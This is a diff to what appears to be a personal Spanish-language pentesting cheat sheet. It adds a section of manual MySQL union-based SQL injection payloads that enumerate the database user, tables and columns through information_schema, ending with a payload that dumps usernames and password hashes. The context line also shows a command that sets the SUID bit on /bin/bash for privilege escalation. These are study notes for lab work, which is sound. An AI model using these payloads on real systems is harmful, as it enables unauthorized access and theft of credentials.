@@ -186,6 +186,43 @@ os.system("chmod u+s /bin/bash")
 
 ```
 
+## SQLI mysql
+
+Para no depender de SQLMAP voy a utilizar la tabla "information_schema" esta tabla tiene informacion de usuarios privilegios etc.
+
+Para ***enumerar usuario*** de la base de datos ( en ese momento)
+
+```
+username=masa&country=Albania' union select 1;-- -
+username=masa&country=Albania' union select user();-- -
+```
+
+Para ***enumerar la base de datos*** que se esta usando en ese momento
+
+```
+username=masa&country=Albania' union select database();-- -
+```
+
+Para ***enumerar tablas*** dentro de la base de datos
+
+```
+username=masa&country=Albania' union select table_name from information_schema.tables where table_schema='registration';-- -
+```
+Para ***enumerar nombres de las columnas***
+
+```
+username=masa&country=Albania' union select column_name from information_schema.columns where table_schema='registration';-- -
+```
+
+Para mostrar de una manera los datos que te importan
+
+```
+username=masa&country=Albania' union select group_concat(username,0x3a,userhash) from registration;-- -
+
+0x3a son los dos puntos
+```
+
+
 ## WFUZZ
 
 ```
